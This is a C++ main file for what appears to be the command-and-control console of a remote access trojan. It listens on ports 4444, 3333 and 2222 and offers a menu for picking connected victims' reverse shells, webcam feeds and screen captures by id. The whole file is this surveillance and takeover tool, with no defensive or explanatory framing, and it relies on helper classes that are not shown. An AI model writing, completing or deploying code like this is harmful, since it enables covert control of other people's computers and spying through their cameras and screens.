#include "Communication.h"
#include "Menu.h"

int main() {
	unsigned int id;
	Communication* communication = new Communication(4444, 3333, 2222);
    thread server(&Communication::acceptClients, communication);
	server.detach();
	while (true) {
		cin.clear();
		cin.get();
		switch (Menu::printOptions()) {
		case 1:
			if (!Menu::printRevShells(communication)) {
				cout << "rev shells not found." << endl;
				break;
			}
			cout << "id: ";
			cin >> id;
			Menu::sendShellByID(communication, id);
			break;
		case 2:
			if (!Menu::printCameras(communication)) {
				cout << "cameras not found." << endl;
				break;
			}
			cout << "id: ";
			cin >> id;
			Menu::sendCameraByID(communication, id);
			break;
		case 3:
			if (!Menu::printScreens(communication)) {
				cout << "screen not found." << endl;
				break;
			}
			cout << "id: ";
			cin >> id;
			Menu::sendScreenByID(communication, id);
			break;
		case 0:
			cout << "Bye !" << endl;
			exit(0);
		default:
			cout << "error" << endl;
		}
	}
    // Keep the main thread alive to allow client handling threads to run

	return 0;
}